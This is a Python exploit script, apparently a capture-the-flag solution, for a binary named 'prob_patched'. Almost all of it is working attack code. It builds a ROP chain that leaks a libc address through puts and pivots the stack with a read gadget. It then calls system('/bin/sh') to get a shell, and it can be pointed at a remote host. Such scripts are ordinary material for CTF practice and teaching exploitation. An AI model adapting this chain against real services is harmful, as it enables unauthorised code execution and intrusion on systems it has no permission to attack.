#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

# context.log_level = 'debug'
exe = context.binary = ELF('./prob_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        pause()
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *0x4012C6
# b *0x4012AE

c
'''.format(**locals())

# ==================== EXPLOIT ====================

def init():
    global p

    p = start()

def exploit():

    offset = 0x10
    pop_rdi = 0x401203
    push_rbp_pop_rdi = 0x4011ff
    leave_ret = 0x4012C5

    puts_gadget = 0x4012A9
    read_gadget = 0x4012BF

    payload = flat({

        offset: [
            exe.got.puts + 0x10,
            push_rbp_pop_rdi,
            puts_gadget
        ]

    }, filler=b'\0')

    sa(b"> \n",payload)

    libc.address = u64(p.recvline()[:-1].ljust(8,b"\x00")) - libc.sym.setvbuf
    info("libc base -> %#x",libc.address)

    movsxd_rdx_rcx = libc.address + 0x143115

    payload = flat({

        offset+0x8: [
            movsxd_rdx_rcx,
            read_gadget
        ]

    }, filler=b'\0')

    sleep(1)
    s(payload)

    payload = flat({

        offset + 0x10: [

            pop_rdi,
            next(libc.search(b'/bin/sh\0')),
            pop_rdi+1,
            libc.sym.system
        ]

    }, filler=b'\0')

    sleep(1)
    s(payload)

    interactive()

def main():

    init()
    exploit()

if __name__ == '__main__':
    main()
